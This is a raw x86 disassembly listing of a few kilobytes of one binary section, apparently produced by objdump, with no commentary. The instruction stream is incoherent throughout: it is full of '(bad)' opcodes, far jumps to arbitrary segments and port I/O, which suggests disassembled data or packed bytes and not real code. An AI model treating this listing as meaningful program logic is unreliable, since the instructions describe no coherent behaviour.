  41c5b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c5b6:	call   0x356fdcbc
  41c5bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c5bc:	add    esi,0x24
  41c5bf:	dec    esi
  41c5c0:	ja     0x41c54d
  41c5c2:	fsubr  DWORD PTR [ebp+0x76422a8e]
  41c5c8:	clc    
  41c5c9:	pusha  
  41c5ca:	lds    ecx,FWORD PTR [ecx-0x58]
  41c5cd:	jmp    0x5b0d3e9d
  41c5d2:	xor    esi,DWORD PTR [ecx+0x3e]
  41c5d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c5d6:	loope  0x41c640
  41c5d8:	add    DWORD PTR [eax+eax*2+0x3b],ebp
  41c5dc:	pusha  
  41c5dd:	or     dh,BYTE PTR [edi]
  41c5df:	es jno 0x41c57b
  41c5e2:	leave  
  41c5e3:	add    ah,cl
  41c5e5:	jne    0x41c654
  41c5e7:	test   ebp,ecx
  41c5e9:	push   ds
  41c5ea:	leave  
  41c5eb:	fs push edi
  41c5ed:	jmp    0xfb442091
  41c5f2:	into   
  41c5f3:	inc    ecx
  41c5f4:	(bad)  
  41c5f5:	mov    eax,DWORD PTR ds:0x311c9531
  41c5fb:	rol    bh,1
  41c5fd:	cli    
  41c5fe:	retf   
  41c5ff:	loop   0x41c5e9
  41c601:	stc    
  41c602:	pop    esp
  41c603:	adc    BYTE PTR [ecx-0xbc87007],dh
  41c609:	out    dx,eax
  41c60a:	(bad)  
  41c60b:	fiadd  DWORD PTR [edx]
  41c60d:	mov    WORD PTR [eax+eax*4],cs
  41c610:	pop    edi
  41c611:	shl    DWORD PTR [ecx],1
  41c613:	repnz push es
  41c615:	not    DWORD PTR [edi+eiz*8+0xb379241]
  41c61c:	retf   
  41c61d:	cmp    al,0x30
  41c61f:	out    dx,al
  41c620:	(bad)  
  41c621:	sbb    eax,0xff44bed0
  41c626:	neg    dh
  41c628:	mov    edx,0xb67501f0
  41c62d:	jnp    0x41c619
  41c62f:	test   ah,0x66
  41c632:	and    eax,0x85c34351
  41c637:	xchg   ebp,eax
  41c638:	mov    ecx,0xafcb56e1
  41c63d:	inc    esi
  41c63e:	shl    bh,0x4e
  41c641:	jns    0x41c65b
  41c643:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c644:	aaa    
  41c645:	fisttp WORD PTR [ecx-0x30c32f44]
  41c64b:	jno    0x41c658
  41c64d:	addr16 mov al,0x35
  41c650:	pop    ebx
  41c651:	call   FWORD PTR [edx+0x2ff2f40e]
  41c657:	shr    DWORD PTR [ecx+0x6a],0x9
  41c65b:	pop    edi
  41c65c:	jae    0x41c60e
  41c65e:	push   cs
  41c65f:	push   esp
  41c660:	subps  xmm7,XMMWORD PTR [eax+0x39b30996]
  41c667:	and    eax,0x406303b8
  41c66c:	xlat   BYTE PTR ds:[ebx]
  41c66d:	inc    ebx
  41c66e:	lods   eax,DWORD PTR ds:[esi]
  41c66f:	hlt    
  41c670:	retf   0xefb5
  41c673:	xlat   BYTE PTR ds:[ebx]
  41c674:	int3   
  41c675:	(bad)  
  41c676:	(bad)  
  41c677:	int    0x11
  41c679:	mov    esp,0xc6c415fc
  41c67e:	ror    DWORD PTR [edi],cl
  41c680:	ds pop es
  41c682:	jns    0x41c673
  41c684:	ins    BYTE PTR es:[edi],dx
  41c685:	jmp    0x7c2d:0xf4827b9a
  41c68c:	aad    0xe5
  41c68e:	mov    esp,0xfd11eabf
  41c693:	daa    
  41c694:	js     0x41c6d9
  41c696:	and    BYTE PTR [edx+edi*1],al
  41c699:	xchg   BYTE PTR [ebx+ebp*1+0xa426ae],bl
  41c6a0:	sub    BYTE PTR [ecx],cl
  41c6a2:	xor    eax,0x4c7cc458
  41c6a7:	in     al,dx
  41c6a8:	pop    esp
  41c6a9:	push   cs
  41c6aa:	mov    edx,0x7a98d497
  41c6af:	fxch   st(0)
  41c6b1:	in     al,dx
  41c6b2:	inc    edi
  41c6b3:	dec    eax
  41c6b4:	jae    0x41c6ab
  41c6b6:	pop    ss
  41c6b7:	push   esp
  41c6b8:	stos   DWORD PTR es:[edi],eax
  41c6b9:	jg     0x41c73a
  41c6bb:	jmp    0x41c6bb
  41c6bd:	dec    edi
  41c6be:	into   
  41c6bf:	mov    ds,WORD PTR [eax-0x21b8623f]
  41c6c5:	retf   
  41c6c6:	inc    edi
  41c6c7:	cmp    bh,0x57
  41c6ca:	sar    BYTE PTR [edi+0x3760543a],0x63
  41c6d1:	(bad)  
  41c6d2:	std    
  41c6d3:	dec    ecx
  41c6d4:	push   edx
  41c6d5:	push   edi
  41c6d6:	shl    DWORD PTR [ecx],0x12
  41c6d9:	rcl    BYTE PTR [ebp+0x4c699e55],0xdf
  41c6e0:	push   esp
  41c6e1:	inc    edx
  41c6e2:	stos   DWORD PTR es:[edi],eax
  41c6e3:	rcl    esp,0x68
  41c6e6:	shl    BYTE PTR [edx],cl
  41c6e8:	xchg   edx,eax
  41c6e9:	std    
  41c6ea:	inc    ebp
  41c6eb:	icebp  
  41c6ec:	std    
  41c6ed:	xchg   ebp,eax
  41c6ee:	push   es
  41c6ef:	out    0x92,eax
  41c6f1:	mov    ?,WORD PTR [ebx+0x7e]
  41c6f4:	nop
  41c6f5:	pop    esi
  41c6f6:	loopne 0x41c6b7
  41c6f8:	sub    DWORD PTR [edx-0x28],esp
  41c6fb:	dec    ecx
  41c6fc:	jbe    0x41c702
  41c6fe:	fbld   TBYTE PTR [eax-0x70]
  41c701:	pop    ds
  41c702:	sub    esp,DWORD PTR [ecx-0x11123df8]
  41c708:	adc    al,0xb6
  41c70a:	sbb    BYTE PTR ds:0xc5f59c3a,ah
  41c710:	mov    bl,0x7c
  41c712:	inc    esp
  41c713:	in     eax,dx
  41c714:	rcl    DWORD PTR [ecx+0x4b],cl
  41c717:	scas   al,BYTE PTR es:[edi]
  41c718:	call   0x3d2662e6
  41c71d:	fsub   st,st(0)
  41c71f:	mov    al,BYTE PTR [edi+0x68]
  41c722:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c723:	lea    esi,[eax]
  41c725:	sar    BYTE PTR [eax+0x32],cl
  41c728:	and    eax,0x3caaa742
  41c72d:	cmc    
  41c72e:	jmp    0x4014183d
  41c733:	or     BYTE PTR [eax],dl
  41c735:	pop    esp
  41c736:	push   ecx
  41c737:	fist   WORD PTR [esi-0x62cea4f0]
  41c73d:	fs jns 0x41c715
  41c740:	mov    fs,edi
  41c742:	and    al,0xd3
  41c744:	retf   0x926b
  41c747:	sbb    bh,cl
  41c749:	push   cs
  41c74a:	stos   BYTE PTR es:[edi],al
  41c74b:	dec    ebx
  41c74c:	ficom  WORD PTR [edi-0x26]
  41c74f:	dec    ebx
  41c750:	mov    WORD PTR [eax+0x302e4106],ds
  41c756:	out    dx,al
  41c757:	sbb    BYTE PTR [esi],0x57
  41c75a:	push   ebx
  41c75b:	ror    BYTE PTR [ecx-0x1f],1
  41c75e:	rcr    BYTE PTR [edx],0x80
  41c761:	cmp    esi,DWORD PTR ss:[edx-0x69]
  41c765:	stc    
  41c766:	push   ss
  41c767:	loopne 0x41c713
  41c769:	push   ebx
  41c76a:	xchg   ecx,eax
  41c76b:	dec    esi
  41c76c:	ss out dx,eax
  41c76e:	dec    esi
  41c76f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c770:	es clc 
  41c772:	cmp    edi,DWORD PTR [edx+esi*4+0x2f]
  41c776:	int3   
  41c777:	push   ds
  41c778:	je     0x41c701
  41c77a:	dec    esi
  41c77b:	sbb    ah,ch
  41c77d:	enter  0x6f77,0x25
  41c781:	test   al,0x6b
  41c783:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c784:	pop    es
  41c785:	cmp    BYTE PTR [eax+0x35ea8af],bh
  41c78b:	pop    ss
  41c78c:	dec    esp
  41c78d:	mov    edx,0xe0e5e70a
  41c792:	push   es
  41c793:	test   al,0x7a
  41c795:	iret   
  41c796:	aas    
  41c797:	mov    esi,ebp
  41c799:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c79a:	mov    ds:0xdf3bc182,al
  41c79f:	rcl    BYTE PTR [ecx],1
  41c7a1:	pop    edx
  41c7a2:	dec    eax
  41c7a3:	mov    esp,0x8a4a982d
  41c7a8:	or     ebx,esp
  41c7aa:	std    
  41c7ab:	mul    DWORD PTR [eax+esi*8+0x4]
  41c7af:	ins    DWORD PTR es:[edi],dx
  41c7b0:	dec    esi
  41c7b1:	xchg   ebx,eax
  41c7b2:	jnp    0x41c78c
  41c7b4:	push   ebp
  41c7b5:	cs adc eax,0x5bf2c233
  41c7bb:	adc    BYTE PTR [eax+0x6042050],bl
  41c7c1:	or     BYTE PTR [esi-0x30ec28f6],ah
  41c7c7:	addr16 dec ebx
  41c7c9:	ret    0x7689
  41c7cc:	push   esp
  41c7cd:	or     al,0xa2
  41c7cf:	jnp    0x41c7ed
  41c7d1:	(bad)  
  41c7d3:	cmp    ebx,DWORD PTR [esi+0x34]
  41c7d6:	imul   esp,DWORD PTR [edi-0x45a3fef1],0x8709f4a0
  41c7e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c7e1:	lods   eax,DWORD PTR ds:[esi]
  41c7e2:	je     0x41c7ee
  41c7e4:	fstp   TBYTE PTR ds:0xcab240bb
  41c7ea:	sbb    esi,DWORD PTR [ecx-0x44]
  41c7ed:	sub    BYTE PTR [ecx],ch
  41c7ef:	(bad)  
  41c7f0:	push   cs
  41c7f1:	loop   0x41c7fb
  41c7f3:	push   esi
  41c7f4:	lea    ebp,[edx-0x53]
  41c7f7:	call   0xa3f6:0x829fef25
  41c7fe:	pop    edx
  41c7ff:	mov    bl,0x41
  41c801:	jp     0x41c7cb
  41c803:	jecxz  0x41c86a
  41c805:	mov    dh,BYTE PTR ds:0xd0e1481e
  41c80b:	push   edx
  41c80c:	(bad)  
  41c80d:	es and al,0x77
  41c810:	test   DWORD PTR [edx-0x6a],edx
  41c813:	mov    ch,0xf2
  41c815:	adc    eax,0xb1b3a0b1
  41c81a:	jl     0x41c883
  41c81c:	sub    al,0xcb
  41c81e:	jns    0x41c89e
  41c820:	imul   ecx,DWORD PTR [ebp+0x4a71e58b],0x78
  41c827:	div    edi
  41c829:	aam    0xd2
  41c82b:	mov    ecx,0x2c720779
  41c830:	lods   eax,DWORD PTR ds:[esi]
  41c831:	and    eax,0xc3bf46cf
  41c836:	mov    al,0x8b
  41c838:	popf   
  41c839:	or     DWORD PTR [esi-0x40dac602],esp
  41c83f:	addr16 in eax,dx
  41c841:	or     ch,ch
  41c843:	in     al,0x7e
  41c845:	rcl    BYTE PTR [ebx],cl
  41c847:	mov    edx,0x115fea7
  41c84c:	push   edx
  41c84d:	(bad)  
  41c84e:	and    al,0x54
  41c850:	leave  
  41c851:	jne    0x41c8a0
  41c853:	addr16 jns 0x41c8ae
  41c856:	call   0xc61a:0x8b74cc09
  41c85d:	sbb    eax,0x5a37dab3
  41c862:	fwait
  41c863:	jns    0x41c8a7
  41c865:	fsub   DWORD PTR [edi+0x540ab2d4]
  41c86b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c86c:	and    al,0x7c
  41c86e:	add    ah,BYTE PTR [edx+edi*4-0x7a]
  41c872:	jmp    0x639d:0x1b579619
  41c879:	je     0x41c8e0
  41c87b:	mov    eax,0x9b82287f
  41c880:	cmp    ah,ch
  41c882:	(bad)  
  41c883:	inc    edi
  41c884:	xchg   esi,eax
  41c885:	xor    DWORD PTR [ecx-0x9],esi
  41c888:	add    al,BYTE PTR [eax-0x42]
  41c88b:	test   al,0x1b
  41c88d:	mov    ah,0x69
  41c88f:	loope  0x41c89c
  41c891:	xchg   ebp,eax
  41c892:	add    DWORD PTR [edx-0x507e2dee],esi
  41c898:	jns    0x41c899
  41c89a:	pop    esp
  41c89b:	push   esi
  41c89c:	out    0xee,eax
  41c89e:	and    al,0x0
  41c8a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c8a1:	gs xchg esi,eax
  41c8a3:	dec    BYTE PTR [edi-0x57]
  41c8a6:	push   es
  41c8a7:	out    dx,eax
  41c8a8:	jb     0x41c8d9
  41c8aa:	adc    dh,BYTE PTR [eax+eiz*4+0x74e645b8]
  41c8b1:	add    DWORD PTR [ecx+0xa],eax
  41c8b4:	sub    esp,DWORD PTR [edi-0x4e6b5c26]
  41c8ba:	das    
  41c8bb:	mov    edx,0x59f98639
  41c8c0:	lods   eax,DWORD PTR ds:[esi]
  41c8c1:	add    al,bh
  41c8c3:	call   0x579d:0xd5ba0898
  41c8ca:	mov    DWORD PTR [edx-0x4c],ebx
  41c8cd:	imul   edx,DWORD PTR [edi+eiz*2+0x581723b4],0xfffffffd
  41c8d5:	push   ds
  41c8d6:	mov    ch,BYTE PTR [eax-0x235db965]
  41c8dc:	dec    ecx
  41c8dd:	mov    DWORD PTR [ebp+0x3be5ba3d],eax
  41c8e3:	ins    DWORD PTR es:[edi],dx
  41c8e4:	popa   
  41c8e5:	out    dx,al
  41c8e6:	into   
  41c8e7:	add    DWORD PTR ds:0x4fdecc03,esi
  41c8ed:	in     al,dx
  41c8ee:	mov    al,ds:0x4cda1f17
  41c8f3:	lock sar dh,0x5e
  41c8f7:	mov    edx,0x1944aaba
  41c8fc:	mov    ecx,0xb7c5e08f
  41c901:	nop
  41c902:	sbb    ecx,DWORD PTR [edi-0x5b846467]
  41c908:	cs jbe 0x41c8c9
  41c90b:	mov    BYTE PTR [ebx-0x23bd2be5],ch
  41c911:	mov    ebp,0xd1154b93
  41c916:	outs   dx,BYTE PTR ds:[esi]
  41c917:	int    0x92
  41c919:	sub    ah,BYTE PTR [edx]
  41c91b:	pushf  
  41c91c:	sar    DWORD PTR [ecx+0x39],cl
  41c91f:	jle    0x41c918
  41c921:	push   edi
  41c922:	sub    DWORD PTR [esi-0x3a0cb682],eax
  41c928:	gs pop esi
  41c92a:	push   edx
  41c92b:	std    
  41c92c:	ss xchg ebp,eax
  41c92e:	cmp    esi,ebp
  41c930:	jg     0x41c8e1
  41c932:	outs   dx,DWORD PTR ds:[esi]
  41c933:	(bad)  
  41c934:	leave  
  41c935:	xor    DWORD PTR [esi-0x2710490],edi
  41c93b:	int    0x2d
  41c93d:	inc    ebx
  41c93e:	retf   0x67e8
  41c941:	dec    edi
  41c942:	mov    ebp,0x5708c017
  41c947:	mov    al,ds:0x587c9e31
  41c94c:	cmc    
  41c94d:	mov    bh,0x3e
  41c94f:	outs   dx,BYTE PTR ds:[esi]
  41c950:	mov    bh,0x9b
  41c952:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c953:	push   edx
  41c954:	inc    ebx
  41c955:	mov    ecx,0x9faea00
  41c95b:	ins    DWORD PTR es:[edi],dx
  41c95c:	mov    ds:0x8f0f23c6,al
  41c961:	dec    eax
  41c962:	ja     0x41c986
  41c964:	fucom  st(6)
  41c966:	dec    esp
  41c967:	popf   
  41c968:	mov    eax,ds:0xbdf6e300
  41c96d:	xor    DWORD PTR [ebx+0x6b],0x3b
  41c971:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c972:	jl     0x41c93e
  41c974:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c975:	fisub  DWORD PTR [eax+0x7d6a71ed]
  41c97b:	jecxz  0x41c99d
  41c97d:	lods   al,BYTE PTR ds:[esi]
  41c97e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c97f:	xchg   ebp,eax
  41c980:	js     0x41c90a
  41c982:	enter  0x66b5,0x92
  41c986:	inc    eax
  41c987:	std    
  41c988:	lods   al,BYTE PTR ds:[esi]
  41c989:	rcl    DWORD PTR [eax-0x1f],1
  41c98c:	in     al,dx
  41c98d:	js     0x41c966
  41c98f:	mov    ds:0xc12a8f8c,eax
  41c994:	pop    esp
  41c995:	and    eax,0x8219420c
  41c99a:	xor    eax,0x4b2a06cd
  41c99f:	js     0x41c9ac
  41c9a1:	loop   0x41c966
  41c9a3:	fdiv   DWORD PTR [edx]
  41c9a5:	jp     0x41c984
  41c9a7:	sub    al,0xd7
  41c9a9:	les    esi,FWORD PTR [edi-0x7f89747e]
  41c9af:	pop    edi
  41c9b0:	mov    ss:0xe9cf1ac7,al
  41c9b6:	push   0xd3a1324d
  41c9bb:	dec    edi
  41c9bc:	scas   al,BYTE PTR es:[edi]
  41c9bd:	push   esi
  41c9be:	lods   eax,DWORD PTR ds:[esi]
  41c9bf:	dec    edi
  41c9c0:	adc    ch,BYTE PTR [eax+0x3cf7d125]
  41c9c6:	sahf   
  41c9c7:	jge    0x41ca1e
  41c9c9:	jns    0x41c992
  41c9cb:	adc    BYTE PTR cs:[ebx+0x29],cl
  41c9cf:	or     al,0xdc
  41c9d1:	sub    al,dh
  41c9d3:	aam    0xcc
  41c9d5:	std    
  41c9d6:	xchg   esi,eax
  41c9d7:	shr    DWORD PTR [edi],cl
  41c9d9:	pop    eax
  41c9da:	lock pop ebp
  41c9dc:	fadd   st(6),st
  41c9de:	xchg   BYTE PTR [ecx-0x44],dh
  41c9e1:	mov    edi,0xf536b8d4
  41c9e6:	jp     0x41c9be
  41c9e8:	sub    al,0x9d
  41c9ea:	cwde   
  41c9eb:	mov    dh,al
  41c9ed:	cmp    bl,BYTE PTR [ebx+ecx*2+0x2f4bd61b]
  41c9f4:	xor    bl,cl
  41c9f6:	jl     0x41c97f
  41c9f8:	cmp    al,0xbf
  41c9fa:	cld    
  41c9fb:	sub    al,0x8d
  41c9fd:	jecxz  0x41ca29
  41c9ff:	imul   edi,DWORD PTR [ebp*1+0x7656617e],0xbdf88a7f
  41ca0a:	in     al,dx
  41ca0b:	cmp    BYTE PTR [ecx],cl
  41ca0d:	cmp    BYTE PTR [edi-0x58e7375d],dl
  41ca13:	adc    eax,0x6b8c5372
  41ca18:	jmp    0x20542d7f
  41ca1d:	fst    DWORD PTR [ecx]
  41ca1f:	imul   BYTE PTR [ebx-0x28b8002]
  41ca25:	(bad)  
  41ca26:	dec    ecx
  41ca27:	xchg   ebp,eax
  41ca28:	pop    edi
  41ca29:	cmc    
  41ca2a:	mov    bh,0x52
  41ca2c:	inc    esi
  41ca2d:	mov    esp,0x6962e0b1
  41ca32:	push   0xda81b396
  41ca37:	imul   esp,DWORD PTR [ebx-0x7c9e70e0],0xfaaadf9a
  41ca41:	pop    esi
  41ca42:	lods   al,BYTE PTR ds:[esi]
  41ca43:	push   ecx
  41ca44:	pop    esp
  41ca45:	xchg   ebp,eax
  41ca46:	dec    eax
  41ca47:	test   DWORD PTR [ecx+0x315fe7bd],ebx
  41ca4d:	fnstenv [edi-0x5ec2267c]
  41ca53:	aas    
  41ca54:	push   eax
  41ca55:	adc    eax,0xde6f0d9c
  41ca5a:	cmp    edx,DWORD PTR ds:0xa1b2aa68
  41ca60:	ds leave 
  41ca62:	fpatan 
  41ca64:	push   edi
  41ca65:	bound  ebp,QWORD PTR [esi+ecx*8]
  41ca68:	retf   0x9ece
  41ca6b:	mov    bl,0x7d
  41ca6d:	pop    es
  41ca6e:	imul   DWORD PTR [ebp-0x3bcdc965]
  41ca74:	cmp    DWORD PTR [ebx+0x3],ecx
  41ca77:	sbb    al,0x77
  41ca79:	pop    esp
  41ca7a:	clc    
  41ca7b:	sbb    bh,BYTE PTR [edx+0x523b2ca7]
  41ca81:	scas   eax,DWORD PTR es:[edi]
  41ca82:	or     eax,0x2788bc99
  41ca87:	(bad)  
  41ca88:	push   0x60
  41ca8a:	rol    BYTE PTR [edi-0x41],1
  41ca8d:	fst    DWORD PTR [ecx-0x2ea14973]
  41ca93:	or     bh,BYTE PTR [eax+0x18]
  41ca96:	pop    ss
  41ca97:	daa    
  41ca98:	push   cs
  41ca99:	mov    dl,0x7
  41ca9b:	je     0x41ca21
  41ca9d:	(bad)  
  41ca9f:	das    
  41caa0:	shr    DWORD PTR [ecx+0x22],cl
  41caa3:	shr    BYTE PTR [ebx],1
  41caa5:	in     eax,dx
  41caa6:	cmp    edi,esi
  41caa8:	mov    edx,0x643a9713
  41caad:	push   ebp
  41caae:	cmp    eax,0xc176d699
  41cab3:	popa   
  41cab4:	call   0x8dc83b7a
  41cab9:	ins    BYTE PTR es:[edi],dx
  41caba:	xchg   edi,edx
  41cabc:	jae    0x41cb0c
  41cabe:	pop    ds
  41cabf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cac0:	sbb    ebx,ebx
  41cac2:	jge    0x41ca5c
  41cac4:	cdq    
  41cac5:	and    eax,0x91f528c7
  41caca:	call   0x6e35:0xbafe4f3e
  41cad1:	icebp  
  41cad2:	test   cl,0xb5
  41cad5:	cmc    
  41cad6:	enter  0x64f,0xee
  41cada:	and    eax,0x440f0dde
  41cadf:	adc    BYTE PTR [ebp+0x1f],al
  41cae2:	sub    DWORD PTR [eax+ebp*4],esi
  41cae5:	jle    0x41ca72
  41cae7:	sbb    eax,0x8d7e011f
  41caec:	jmp    0x41ca92
  41caee:	and    DWORD PTR [edi],esi
  41caf0:	or     BYTE PTR [eax-0x4c],dh
  41caf3:	or     al,0x10
  41caf5:	add    dh,BYTE PTR [ecx]
  41caf7:	and    BYTE PTR [esi+ecx*1],al
  41cafa:	jno    0x41caea
  41cafc:	movhps QWORD PTR [esi-0x101a6594],xmm5
  41cb03:	xlat   BYTE PTR ds:[ebx]
  41cb04:	into   
  41cb05:	daa    
  41cb06:	shl    esp,0x72
  41cb09:	pop    ecx
  41cb0a:	push   edi
  41cb0b:	mov    ds:0xb4f6b138,eax
  41cb10:	sbb    DWORD PTR [ecx],ebp
  41cb12:	lds    esp,FWORD PTR [edx]
  41cb14:	mov    ds:0x861e5ed9,eax
  41cb19:	out    dx,al
  41cb1a:	sbb    BYTE PTR [eax+edx*8+0x5575edce],bh
  41cb21:	das    
  41cb22:	ret    
  41cb23:	jnp    0x41cb96
  41cb25:	cmp    al,0x9c
  41cb27:	es ds pop eax
  41cb2a:	sbb    ebx,DWORD PTR [eax-0x744d8caa]
  41cb30:	outs   dx,DWORD PTR ds:[esi]
  41cb31:	data16 arpl WORD PTR [eax+0x5d],bx
  41cb35:	pop    ds
  41cb36:	frndint 
  41cb38:	or     DWORD PTR [edi+edi*1-0x1a],edx
  41cb3c:	mov    edx,0x8c26a73c
  41cb41:	sbb    ch,BYTE PTR [edi-0x6509898e]
  41cb47:	cmp    eax,0xd33f8651
  41cb4c:	lds    edi,FWORD PTR [ebp+0x71]
  41cb4f:	pop    edi
  41cb50:	sub    esp,edi
  41cb52:	add    edi,DWORD PTR ds:0xe9bd455a
  41cb58:	fs mov ch,0xaf
  41cb5b:	fistp  DWORD PTR [ebx-0x715fc7e6]
  41cb61:	fsub   DWORD PTR [esi+0x18]
  41cb64:	pop    ebp
  41cb65:	pusha  
  41cb66:	fwait
  41cb67:	scas   al,BYTE PTR es:[edi]
  41cb68:	fdiv   DWORD PTR cs:[edx-0x64810127]
  41cb6f:	test   al,0xc4
  41cb71:	lock and al,0xfd
  41cb74:	cmp    esp,DWORD PTR [ebp-0x62]
  41cb77:	aaa    
  41cb78:	fs sub eax,0x3ad2a8ce
  41cb7e:	test   eax,0x4a75924a
  41cb83:	push   ss
  41cb84:	fcomip st,st(0)
  41cb87:	daa    
  41cb88:	push   es
  41cb89:	mov    ds:0x758de7ea,eax
  41cb8e:	dec    esi
  41cb8f:	imul   ebp,DWORD PTR [ebp+0xe],0xee22833e
  41cb96:	jle    0x41cb53
  41cb98:	jne    0x41cbd6
  41cb9a:	lds    ebx,FWORD PTR [ebx+0x0]
  41cb9d:	push   cs
  41cb9e:	adc    DWORD PTR [ebx-0x504172b],0x6c
  41cba5:	call   0xd901:0x94f5db6b
  41cbac:	add    al,0x59
  41cbae:	test   eax,0x8ac79907
  41cbb3:	and    al,0x7
  41cbb5:	stos   DWORD PTR es:[edi],eax
  41cbb6:	in     eax,dx
  41cbb7:	pop    ebx
  41cbb8:	pop    esi
  41cbb9:	test   BYTE PTR [edi-0x6e],bl
  41cbbc:	push   ss
  41cbbd:	ja     0x41cc19
  41cbbf:	fcom   st(5)
  41cbc1:	mov    esp,0x8fe1ca23
  41cbc6:	jbe    0x41cb57
  41cbc8:	sbb    cl,ch
  41cbca:	mov    es,edx
  41cbcc:	aad    0xef
  41cbce:	sbb    BYTE PTR [ecx],dh
  41cbd0:	pusha  
  41cbd1:	push   ecx
  41cbd2:	inc    edi
  41cbd3:	inc    esp
  41cbd4:	push   ds
  41cbd5:	std    
  41cbd6:	adc    ebp,ecx
  41cbd8:	pop    esi
  41cbd9:	or     DWORD PTR [ebx+0x7b17d739],ecx
  41cbdf:	jne    0x41cc57
  41cbe1:	inc    eax
  41cbe2:	cmp    dh,dl
  41cbe4:	adc    eax,ebx
  41cbe6:	ficomp WORD PTR [edx+0x60]
  41cbe9:	or     eax,0x7e1d6599
  41cbee:	dec    ebx
  41cbef:	dec    esi
  41cbf0:	mov    ds:0x49f6af19,al
  41cbf5:	push   ebp
  41cbf6:	fidiv  WORD PTR [edx+0x706a7a31]
  41cbfc:	jmp    0x41cbce
  41cbfe:	es pushf 
  41cc00:	sbb    al,0xe
  41cc02:	sub    eax,0x89cd39e
  41cc07:	mov    gs,WORD PTR [eax-0x45]
  41cc0a:	imul   DWORD PTR [edi-0x4a66067a]
  41cc10:	or     eax,0xc0a5c4f
  41cc15:	jle    0x41cc2d
  41cc17:	push   ecx
  41cc18:	mov    esi,DWORD PTR [esi+ecx*2]
  41cc1b:	sub    ecx,esp
  41cc1d:	mov    dl,0xcb
  41cc1f:	mov    fs,WORD PTR [esi+0x234cce67]
  41cc25:	mov    bl,0x6d
  41cc27:	cmp    eax,0xe84dd419
  41cc2c:	sub    eax,0x4e5cce78
  41cc31:	jle    0x41cc00
  41cc33:	sbb    eax,DWORD PTR [edi-0x2c37c16d]
  41cc39:	ror    DWORD PTR [edx+esi*1-0x36],1
  41cc3d:	fdivr  QWORD PTR [edx+ecx*8-0x35]
  41cc41:	jge    0x41cc3d
  41cc43:	or     BYTE PTR [ebx-0x2a],ah
  41cc46:	imul   edx,DWORD PTR [edx+ebx*2+0x2],0xced0c2ac
  41cc4e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cc4f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cc50:	dec    ebp
  41cc51:	daa    
  41cc52:	dec    edi
  41cc53:	fimul  DWORD PTR [eax]
  41cc55:	(bad)  
  41cc56:	inc    ebp
  41cc57:	stos   BYTE PTR es:[edi],al
  41cc58:	adc    DWORD PTR [edx+0x54],eax
  41cc5b:	mov    DWORD PTR [edx+eiz*1+0x7eeb6f11],ebp
  41cc62:	gs jns 0x41cc69
  41cc65:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cc66:	pop    ecx
  41cc67:	rol    BYTE PTR [ecx*2-0x49b30d8b],cl
  41cc6e:	mov    ch,BYTE PTR [ebp-0x56]
  41cc71:	sbb    BYTE PTR [ecx+edi*2+0x67],0xa3
  41cc76:	fmul   DWORD PTR [ebx+ebp*2+0x79]
  41cc7a:	xchg   esi,eax
  41cc7b:	fadd   QWORD PTR [edx]
  41cc7d:	dec    eax
  41cc7e:	mov    eax,ds:0x31571104
  41cc83:	out    dx,eax
  41cc84:	fs pushf 
  41cc86:	mov    DWORD PTR [esi+0x5741d82d],eax
  41cc8c:	pop    edi
  41cc8d:	mov    bh,0xff
  41cc8f:	fst    QWORD PTR [ebp+0x66]
  41cc92:	fsubr  QWORD PTR [eax]
  41cc94:	(bad)  
  41cc96:	imul   edi,DWORD PTR [edx+0x42],0xffffffad
  41cc9a:	mov    ss,eax
  41cc9c:	pop    eax
  41cc9d:	or     ebp,DWORD PTR [edx+0x57]
  41cca0:	stos   BYTE PTR es:[edi],al
  41cca1:	cwde   
  41cca2:	(bad)  
  41cca4:	xor    dh,BYTE PTR [ecx-0x7]
  41cca7:	or     al,0x33
  41cca9:	mov    ah,0x2a
  41ccab:	aas    
  41ccac:	cmp    BYTE PTR [edx+0x280d2992],dl
  41ccb2:	stc    
  41ccb3:	and    bl,cl
  41ccb5:	dec    ebp
  41ccb6:	push   ss
  41ccb7:	push   edx
  41ccb8:	push   esi
  41ccb9:	xchg   edx,eax
  41ccba:	call   0xcdcebab1
  41ccbf:	and    ecx,eax
  41ccc1:	fsub   st(3),st
  41ccc3:	leave  
  41ccc4:	add    al,0x60
  41ccc6:	xor    DWORD PTR [ebp+0x75e8c3e3],eax
  41cccc:	xchg   DWORD PTR ds:0xbecb5d1,eax
  41ccd2:	(bad)  
  41ccd4:	ror    BYTE PTR [esp+esi*8-0x55adbffa],cl
  41ccdb:	in     al,0x52
  41ccdd:	out    0xfc,eax
  41ccdf:	push   ds
  41cce0:	push   edx
  41cce1:	add    ch,dh
  41cce3:	xor    eax,0x2ad18915
  41cce8:	enter  0xcd9b,0x3a
  41ccec:	rcl    bl,cl
  41ccee:	aad    0xae
  41ccf0:	pop    ebp
  41ccf1:	div    DWORD PTR [ecx+0x30]
  41ccf4:	les    edx,FWORD PTR [ebp-0x65ddf9eb]
  41ccfa:	outs   dx,BYTE PTR ds:[esi]
  41ccfb:	add    edi,DWORD PTR [ecx-0xa28f10e]
  41cd01:	adc    ecx,eax
  41cd03:	retf   
  41cd04:	and    al,BYTE PTR [eax+0x2c779a59]
  41cd0a:	mov    al,0x96
  41cd0c:	sub    esp,DWORD PTR ds:0x1a716f3e
  41cd12:	or     BYTE PTR [eax+eax*2],0x58
  41cd16:	pop    eax
  41cd17:	adc    DWORD PTR [ecx-0x6c],edi
  41cd1a:	xchg   ch,dh
  41cd1c:	mov    ebx,0x808024bb
